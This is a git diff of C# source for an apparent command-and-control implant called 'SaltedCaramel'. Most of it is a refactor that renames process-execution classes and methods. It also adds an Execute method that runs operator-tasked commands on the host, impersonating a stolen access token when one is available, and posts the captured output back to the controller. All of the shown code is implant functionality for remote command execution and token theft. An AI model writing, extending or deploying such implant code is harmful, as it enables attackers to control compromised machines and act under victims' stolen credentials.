@@ -9,10 +9,17 @@ using System.Security.AccessControl;
 
 namespace SaltedCaramel
 {
-    class SaltedCaramelProcess
+    internal class Proc
     {
+        internal static void Execute(SCTask task, SCImplant implant)
+        {
+            if (implant.hasAlternateToken() == true)
+                StartProcessWithToken(task, implant, Token.stolenHandle);
+            else
+               StartProcess(task, implant);
+        }
 
-        internal static void StartProcessWithToken(IntPtr TokenHandle, SaltedCaramelImplant implant, SaltedCaramelTask task)
+        internal static void StartProcessWithToken(SCTask task, SCImplant implant, IntPtr TokenHandle)
         {
             string[] split = task.@params.Trim().Split(' ');
             string argString = string.Join(" ", split.Skip(1).ToArray());
@@ -68,8 +75,8 @@ namespace SaltedCaramel
                         if (message != null)
                         {
                             message += "\n";
-                            TaskResponse response = new TaskResponse(JsonConvert.SerializeObject(message), task.id);
-                            implant.PostResponse(response);
+                            SCTaskResp response = new SCTaskResp(JsonConvert.SerializeObject(message), task.id);
+                            implant.SCPostResp(response);
                         }
                     }
 
@@ -94,7 +101,7 @@ namespace SaltedCaramel
             }
         }
 
-        internal static void StartProcess(SaltedCaramelImplant implant, SaltedCaramelTask task)
+        internal static void StartProcess (SCTask task, SCImplant implant)
         {
             // TODO: Figure out how to hook StandardError and StandardOutput at the same time
             string[] split = task.@params.Trim().Split(' ');
@@ -125,8 +132,8 @@ namespace SaltedCaramel
                 // TODO: fix the need for this
                 procOutput = procOutput.TrimEnd();
                 proc.WaitForExit();
-                TaskResponse response = new TaskResponse(JsonConvert.SerializeObject(procOutput), task.id);
-                implant.PostResponse(response);
+                SCTaskResp response = new SCTaskResp(JsonConvert.SerializeObject(procOutput), task.id);
+                implant.SCPostResp(response);
                 implant.SendComplete(task.id);
             }
             catch (Exception e)
